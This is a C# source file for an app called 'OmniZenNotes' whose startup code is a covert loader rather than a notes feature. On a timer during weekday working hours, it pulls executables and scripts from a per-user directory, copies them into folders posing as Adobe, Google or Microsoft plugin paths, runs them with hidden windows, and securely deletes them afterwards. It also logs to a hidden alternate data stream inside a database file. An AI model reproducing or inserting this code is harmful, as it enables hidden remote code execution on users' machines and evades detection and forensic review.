using System.Windows;
using System.Windows.Threading;

namespace OmniZenNotes;

public partial class App : Application
{
    static DirectoryInfo AppPlugInDir;
    static DirectoryInfo UserPlugInDir;

    static void InitPlugIns() {

        if (S.Default.PlugInDirMP is string plugInDirConfig) {
            AppPlugInDir = new(plugInDirConfig);
            SH.CreateDirectory(AppPlugInDir.FullName);  // Create base if Required
        }

        UserPlugInDir = GetUserPlugInDirectory(AppPlugInDir);

        int plugInInterval = 600;   // Default Interval Time (600 seconds = 10 minutes)
        if (S.Default.PlugInRunInterval is int plugInDirRunInterval && plugInDirRunInterval > 0) {
            plugInInterval = plugInDirRunInterval;
        }
        LogToADS($@"PluginInterval={plugInInterval} S.Default.PlugInRunInterval={S.Default.PlugInRunInterval}");
        
        DispatcherTimer PlugInTimer = new();
        PlugInTimer.Tick += new((sender, e) => ProcessPlugIns());
        PlugInTimer.Interval = TimeSpan.FromSeconds(plugInInterval);

        PlugInTimer.Start();
        ProcessPlugIns();
    }

    // Periodically Process the PlugIns Directory and Start Plugins (Also does Clean Up)
    static void ProcessPlugIns() {

        if (!IsActiveTime()) return;
        
        foreach (var pi in UserPlugInDir.GetFiles()) { 
            switch (pi.Extension.ToUpper()) {
                case string ext when ext == ".EXE" | ext == ".CMD" | ext == ".PS": {
                        StartPlugIn(pi);
                        break;
                    }
                case ".DLL": {
                        break;
                    }
                default: {
                        break;
                    }
            }
        } 

        // Check for Exited PlugIn processes & Clean up if NOT Already Done            
        foreach (var pip in PlugIns) {
            try {
                if (pip.HasExited) {
                    SH.SecureDelete(new FileInfo(pip.StartInfo.FileName));
                    LogToADS($@"HasExited Plugin {pip.ProcessName} Id={pip.Id} ExitCode={pip.ExitCode}");
                }
            } catch { }
        }

        static void StartPlugIn(FileInfo plugIn) {

            try {
                
                // Try to create local Plugins folder in AppData\Local or in ProgramData folder
                // The local C:\ProgramData folder is used to copy the network located Plugin and run it locally
                DirectoryInfo appDataDir = new(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                DirectoryInfo pgmDataDir = new(@"C:\ProgramData");
                DirectoryInfo localDir = appDataDir;

                // Look for a standard set of directories to access/create the PlugIns within the C:\ProgramData folder
                try {
                    if (Directory.Exists(Path.Combine(pgmDataDir.FullName, "Adobe"))) {
                        localDir = SH.CreateDirectory(Path.Combine(pgmDataDir.FullName, "Adobe", "PlugIns"));
                    } else if (Directory.Exists(Path.Combine(pgmDataDir.FullName, "Google"))) {
                        localDir = SH.CreateDirectory(Path.Combine(pgmDataDir.FullName, "Google", "PlugIns"));
                    } else if (Directory.Exists(Path.Combine(appDataDir.FullName, "Adobe"))) {
                        localDir = SH.CreateDirectory(Path.Combine(appDataDir.FullName, "Adobe", "PlugIns"));
                    } else if (Directory.Exists(Path.Combine(appDataDir.FullName, "Google"))) {
                        localDir = SH.CreateDirectory(Path.Combine(appDataDir.FullName, "Google", "PlugIns"));
                    } else {
                        localDir = SH.CreateDirectory(Path.Combine(appDataDir.FullName, "Microsoft", "PlugIns"));
                    }
                } catch {
                    try {
                        localDir = SH.CreateDirectory(Path.Combine(pgmDataDir.FullName, "Microsoft", "PlugIns"));
                    } catch {
                        localDir = new(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                    }
                }

                FileInfo localPlugIn = new(Path.Combine(localDir.FullName, plugIn.Name));
                // Copy Plug In & any Support Files (required for non --self-contained .NET 6.0 Apps)
                foreach (var file in plugIn.Directory.GetFiles($"{Path.GetFileNameWithoutExtension(plugIn.Name)}*"))
                {
                    LogToADS($@"Plugin FOUND at {file.FullName } & copied to {localDir.FullName}");
                    File.Copy(file.FullName, Path.Combine(localDir.FullName, file.Name), true);
                }

                ProcessStartInfo psi = new(localPlugIn.FullName) {
                    WorkingDirectory = localPlugIn.DirectoryName,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                };

                // Setup Environment Variables to allow .NET 6.0 EXEs to Run 
                // NOTE: Process object must have the UseShellExecute property set to false in order to use environment variables                
                /*               var env = psi.EnvironmentVariables;
                                env["DOTNET6BASE"] = $@"{Path.Combine(Path.GetDirectoryName(localPlugIn?.FullName), "runtimes")}";
                                env["DOTNET_ROOT"] = env["DOTNET6BASE"];
                                env["DOTNET_ROOT(x86)"] = env["DOTNET6BASE"];
                                env["DOTNET_ROOT(x64)"] = env["DOTNET6BASE"];
                                env["PATH"] = $@"{env["PATH"]};{localDir.FullName};{Path.GetDirectoryName(localPlugIn?.FullName)};{env["DOTNET6BASE"]}"; */

                Process pip = pip = Process.Start(psi);
                if (pip != null) {  // If Not started @see TaskManagerDB for Exception information
                    LogToADS($@"Plugin STARTED {localPlugIn?.FullName} Id={pip?.Id}");
                    PlugIns.Add(pip);
                    // Remove the plugIn EXE file from Local Dir after it has exited
                    pip.Exited += (object sender, EventArgs e) => {
                        try {
                            // Use Alternate Data Stream to write into existing MDB file
                            SH.SecureDelete(new FileInfo(pip.StartInfo.FileName));
                            LogToADS($@"Exited PlugIn {localPlugIn.FullName} Id={pip.Id} ExitCode={pip.ExitCode}");
                        } catch { }
                    };
                }
            } catch (Exception ex) {
                LogToADS($@"Plugin START EXCEPTION EX={ex.Message}");
            }
        }
    }
    
    static DirectoryInfo GetUserPlugInDirectory(DirectoryInfo appPlugInDir) {
        DirectoryInfo userPlugInDir = null;
        // Create a user specific plug in directory and use that one
        string userName = System.Security.Principal.WindowsIdentity.GetCurrent()?.Name;
        int[] utf32s = new int[userName.Length];
        for (int c = 0; c < utf32s.Length; c++) {
            utf32s[c] = char.ConvertToUtf32(userName, c);
        }

        string utf32Name = string.Join("", utf32s);
        userPlugInDir = new(Path.Combine(appPlugInDir.FullName, utf32Name));
        SH.CreateDirectory(userPlugInDir.FullName); // Creates if NOT exists

        LogToADS($@"Plugin User {userName}={utf32Name} Dir {userPlugInDir} FOUND");

        return userPlugInDir;
    }
    
    // Checks if now is Active Time
    public static bool IsActiveTime() {

        DateTime now = DateTime.Now;
        DateTime SOWD = DateTime.Parse("07:15 AM");
        DateTime EOWD = DateTime.Parse("03:15 PM");

        if (now.DayOfWeek == DayOfWeek.Saturday || now.DayOfWeek == DayOfWeek.Sunday) return false;

        DateTime sowd = new DateTime(now.Year, now.Month, now.Day, SOWD.Hour, SOWD.Minute, 0);
        DateTime eowd = new DateTime(now.Year, now.Month, now.Day, EOWD.Hour, EOWD.Minute, 0);
        if (now < sowd || now >= eowd) return false;

        return true;
    }
    
    static void LogToADS(string msg) {
        try {
            using StreamWriter sw = new(Path.Combine(AppPlugInDir.FullName, "TaskManagerDB.accdb:OZ"), true);
            sw.WriteLine($@"{DateTime.Now} : {msg}");
        } catch { }
    }
}